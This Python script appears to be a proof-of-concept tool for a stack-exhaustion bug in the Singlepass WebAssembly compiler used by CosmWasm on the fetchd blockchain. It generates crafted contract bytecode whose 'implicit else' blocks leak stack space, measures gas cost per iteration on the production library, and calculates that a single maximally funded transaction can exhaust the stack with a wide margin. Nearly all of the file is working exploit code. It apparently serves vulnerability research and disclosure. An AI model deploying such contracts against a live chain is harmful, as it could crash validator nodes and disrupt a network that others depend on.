#!/usr/bin/env python3
"""
Reachability analysis for the Singlepass "implicit else" stack exhaustion on
fetchd, with CORRECT gas units on both sides of the comparison.

Chain facts (measured from the fetchhub genesis archives):
    consensus_params.block.max_gas = 1_500_000 (fetchhub-1/2)
                                   = 2_000_000 (fetchhub-3/4, current)
and baseapp's defaultTxSelector only includes a tx in a block proposal when
    (txGasLimit + totalTxGas) <= maxBlockGas
so a single transaction can never declare more than max_gas gas.

UNIT WARNING (this script previously got this wrong):
the VM reports gas in *CosmWasm gas points*; the chain budgets in *SDK gas*.
wasmd/x/wasm/types/gas_register.go:

    DefaultGasMultiplier = 140_000   "how many CosmWasm gas points = 1 SDK gas"
    ToWasmVMGas(sdk)   = sdk * 140_000
    FromWasmVMGas(vm)  = vm  / 140_000

So every number this script derives from the VM must be divided by 140_000
before it is compared against `max_gas`.  Dividing SDK gas directly by a
cost expressed in VM points overstates the cost by 140_000x and makes the
trigger look unreachable when it is in fact reachable with a ~258x margin.

This script measures, on the production .so:
  * the minimum number of pre-pushed values (register pressure) that makes
    the block parameter spill and start leaking;
  * the gas cost per iteration of the leanest leaking shape, in VM points;
  * how much of the 1 MiB Singlepass stack a maximally funded transaction
    (gas_limit = max_gas) can actually consume.
"""
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                              # noqa: E402
from wasm_builder import (                       # noqa: E402
    Module, I32, I64, op_i32_const, op_i64_const, op_nop, op_end, op_if, op_else,
    op_drop, op_call, op_local_get, op_local_set, op_local_tee, op_i32_sub,
    op_loop, op_global_get, op_global_set, op_br_if,
)

RESP = b'{"ok":{"messages":[],"attributes":[],"events":[],"data":null}}'
STACK_BYTES = 1 << 20          # the dedicated Singlepass stack (wasmer default)
LEAK_PER_ITER = 8             # bytes leaked per if-block execution
MULT = 140_000                # wasmd DefaultGasMultiplier (VM points per SDK gas)


def build(prefix_count, explicit, iterations):
    """Leanest possible leaking shape.

    The loop body is:
        <prefix+1> x local.get $value
        local.get $condition
        if (type $pass) [else] end      ; (param i64) (result i64)
        drop x prefix
        call $probe                     ; touches the drifted stack
        <counter>
    """
    m = Module()
    m.add_memory(2, export="memory")
    t_pass = m.add_type([I64], [I64])
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    g_val = m.add_global(I64, True, op_i64_const(0))
    probe = m.add_func([], [], body=op_nop())

    b = bytearray()
    b += op_i32_const(iterations) + op_local_set(3)
    b += op_loop()
    for _ in range(prefix_count + 1):
        b += op_local_get(0)
    b += op_local_get(1)
    b += op_if(t_pass)
    if explicit:
        b += op_else()
    b += op_end()
    b += op_global_set(g_val)
    for _ in range(prefix_count):
        b += op_drop()
    b += op_call(probe)
    b += op_local_get(3) + op_i32_const(1) + op_i32_sub() + op_local_tee(3) + op_br_if(0)
    b += op_end()
    b += op_global_get(g_val)
    check = m.add_func([I64, I32, I64], [I64], locals=[I32], body=bytes(b))

    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    ex = bytearray()
    ex += op_i64_const(123) + op_i32_const(0) + op_i64_const(123)
    ex += op_call(check) + op_local_set(3)
    ex += op_i32_const(64) + op_local_get(3) + b"\x37\x03\x00"
    ex += op_i32_const(16)
    m.add_func([I32, I32, I32], [I32], locals=[I64], body=bytes(ex), export="execute")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def run(iterations, prefix, explicit=False, vm_limit=1 << 62):
    """Runs the shape; returns (verdict, vm_gas_points)."""
    wasm = build(prefix, explicit, iterations)
    base = tempfile.mkdtemp()
    vm = R.VM()
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, vm_limit)
    res2, rep2, err2 = vm.execute(cache, checksum, vm_limit)
    err = vm._vec_str(err2)
    v = "STACK-EXH" if "call stack exhausted" in err else ("ERR" if err else "ok")
    return v, rep2.used_internally


def gas_per_iteration(prefix):
    """Marginal gas per loop iteration, from two large successful runs.

    The result is in CosmWasm gas POINTS (VM units).
    """
    a_v, a_g = run(20000, prefix)
    b_v, b_g = run(40000, prefix)
    if a_v != "ok" or b_v != "ok":
        return None
    return (b_g - a_g) / 20000.0


def main():
    print("1) Register pressure needed for the block parameter to spill")
    print("   (prefix = number of extra values pushed before the if)")
    print()
    print("   %-8s %-12s %-14s %-14s" % ("prefix", "verdict@400k",
                                         "VM points/iter", "SDK gas/iter"))
    leaking_prefix = None
    for prefix in range(0, 9):
        v, g = run(400000, prefix)
        gpi = gas_per_iteration(prefix)
        mark = ""
        if v == "STACK-EXH" and leaking_prefix is None:
            leaking_prefix = prefix
            mark = "  <== first leaking prefix"
        print("   %-8d %-12s %-14s %-14s%s"
              % (prefix, v,
                 ("%.0f" % gpi) if gpi else "-",
                 ("%.4f" % (gpi / MULT)) if gpi else "-", mark))
        sys.stdout.flush()

    print()
    print("2) Reachability with the chain's gas ceiling")
    print()
    best_gpi = None
    for prefix in range(0, 9):
        if prefix < (leaking_prefix if leaking_prefix is not None else 99):
            continue          # this prefix does not leak at all
        gpi = gas_per_iteration(prefix)
        if gpi and (best_gpi is None or gpi < best_gpi):
            best_gpi = gpi
    print("   cheapest *leaking* iteration : %d VM points = %.4f SDK gas (prefix >= %s)"
          % (best_gpi, best_gpi / MULT, leaking_prefix))
    needed_iters = STACK_BYTES // LEAK_PER_ITER
    for max_gas in (1_500_000, 2_000_000):
        vm_budget = max_gas * MULT
        iters = vm_budget / best_gpi
        drift = iters * LEAK_PER_ITER
        print("   max_gas=%-10d SDK gas (= %d VM points):" % (max_gas, vm_budget))
        print("        affordable iterations ~ %-12.0f" % iters)
        print("        stack drift          ~ %.0f bytes of %d (%.2f%% of the stack)"
              % (drift, STACK_BYTES, 100.0 * drift / STACK_BYTES))
        print("        iterations needed to exhaust the stack : %d" % needed_iters)
        print("        margin                                 : %.0fx"
              % (iters / needed_iters))
    print()
    print("   => the trigger IS reachable: a single transaction funded at the chain's")
    print("      max_gas budget can run %.0fx more iterations than the stack needs."
          % ((2_000_000 * MULT / best_gpi) / needed_iters))
    print()
    print("   Sanity check: the explicit-else control (same shape, else present)")
    print("   must NOT leak.  prefix=4, 400000 iterations:")
    v, g = run(400000, 4, explicit=True)
    print("      verdict = %s   gas = %d VM points" % (v, g))


if __name__ == "__main__":
    main()
